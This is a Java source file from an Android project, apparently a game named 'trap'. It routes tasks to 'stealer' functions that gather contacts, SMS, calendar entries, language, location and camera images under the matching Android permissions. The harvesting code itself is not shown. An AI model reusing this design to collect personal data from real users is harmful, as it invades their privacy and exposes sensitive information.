package de.hpi3d.gamepgrog.trap.tasks;

import android.Manifest;

import java.util.Arrays;
import java.util.List;

import de.hpi3d.gamepgrog.trap.android.CalendarStealer;
import de.hpi3d.gamepgrog.trap.android.CameraStealer;
import de.hpi3d.gamepgrog.trap.android.DataStealer;
import de.hpi3d.gamepgrog.trap.android.LocationStealer;
import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
import de.hpi3d.gamepgrog.trap.datatypes.Contact;
import de.hpi3d.gamepgrog.trap.datatypes.Language;
import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
import de.hpi3d.gamepgrog.trap.datatypes.UserData;

public class TaskResolverManager {

    private final static TaskResolver<Contact> contactTaskResolver =
            new SyncTaskResolver<>(
                    "contact",
                    new String[]{
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.READ_SMS},
                    DataStealer::takeContactData);

    private final static TaskResolver<CalendarEvent> calendarTaskResolver =
            new SyncTaskResolver<>(
                    "calendar",
                    new String[]{
                            Manifest.permission.READ_CALENDAR,
                            Manifest.permission.WRITE_CALENDAR},
                    CalendarStealer::takeCalendarData);

    private final static TaskResolver<Language> languageResolver =
            new SyncTaskResolver<>(
                    "language",
                    new String[]{},
                    DataStealer::takeLanguage);

    
    private final static TaskResolver<LocationData> locationTaskResolver =
            new LocationTaskResolver(
                    "location",
                    new String[] {
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                            Manifest.permission.ACCESS_FINE_LOCATION},
                    LocationStealer::takeSingleLocationData);

    private final static ImageTaskResolver imageTaskResolver =
            new ImageTaskResolver(
                    "picture",
                    new String[] {Manifest.permission.CAMERA},
                    CameraStealer::takeUserImage);

    private final static SyncTaskResolver<LocationData> waitTaskResolver =
            new SyncTaskResolver<>(
                    "wait",
                    "location",
                    new String[]{
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                            Manifest.permission.ACCESS_FINE_LOCATION},
                    LocationStealer::getStealResult);

    public static TaskResolver<? extends UserData> getResolverFor(Task task) {
        List<TaskResolver> resolvers = Arrays.asList(
                contactTaskResolver,
                calendarTaskResolver,
                languageResolver,
                locationTaskResolver,
                imageTaskResolver,
                waitTaskResolver);

        for (TaskResolver resolver : resolvers) {
            if (resolver.applicableFor(task)) {
                return resolver;
            }
        }
        throw new UnsupportedOperationException("There is no Resolver for a task with datatype: "
                + task.getDatatype());
    }
}
